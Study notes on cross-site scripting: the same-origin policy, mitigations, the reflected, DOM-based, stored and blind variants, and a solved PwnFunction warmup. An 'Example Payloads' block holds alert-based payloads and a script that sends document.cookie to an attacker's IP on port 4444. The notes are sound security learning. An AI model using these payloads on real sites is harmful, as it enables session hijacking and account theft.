# XSS
## Same Origin Policy
- checks protocol, host, and port of a website
- if all those are the same then the brower allows the two pages to read/write to each other
## Migitations
- Use output encoding when including data into the HTML document
- DOMPurify library
## Reflected XSS
Input to a webpage is reflected back to the user in the response from the webserver
1. user clicks malicious link (www.acme.com?message=`<script>evil()</script>`)
2. the web server by incorporate the value into the HTML document created for the user (Source code: `<h1>Hello {value of message}</h1>`)
3. the web server returns malicious document to the user (`<h1><script>evil()</script></h1>`)
4. user's browser executes the script `<script>evil()</script>`
## DOM-based XSS
User input lands in dangerous part of JS code
1. user clicks malicious object on page (`<span onmouseover='evil();'></span>`)
2. JS parses the input and incorporates into the page using the DOM (Source code: `<h1>Hello {value of message}</h1>`)
3. Browser executes script `evil()`
4. Note: vulnerability is entirely in the browser
5. Look for usage of `innerHTML`
## Persistent/Stored XSS
Malicious JS is stored in the webserver and served to the user upon request
1. Database is poisoned with an insertion of a script (Field: message, value: `<script>evil()</script>`)
2. The application server incorporates the value into the HTML document created for the user (Source code: `<h1>Hello {value of message}</h1>`)
3. Document generated by application: `<h1>Hello <script>evil()</script></h1>`
4. User's browser executes `<script>evil()</script>`
## Blind XSS
- XSS an admin panel that you do not have access to
## Example Payloads
```html
<!-- user alert(document.domain) -->
<script>alert(document.domain)</script>
<!-- self firing -->
<img src=x onerror=alert(1) />
<svg onload=alert(1)></svg>
<!-- 192.168.0.192 is hacker's IP and they are listening on port 4444, this lets them access the session cookie -->
<script>new Image().src = "http://192.168.0.192:4444/hacker.php?output="+document.cookie;</script>

```

## XSS Challenges
### Ma Spaghet!
```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
<!-- Payload -->
<!-- https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=%3Csvg%20onload=alert(1)%3E -->
<svg onload=alert(1)>
```
### Jefff
### Ugandan Knuckles
### Ricardo Milos
### Ah That's Hawt 
### Ligma
### Mafia
### Ok, Boomer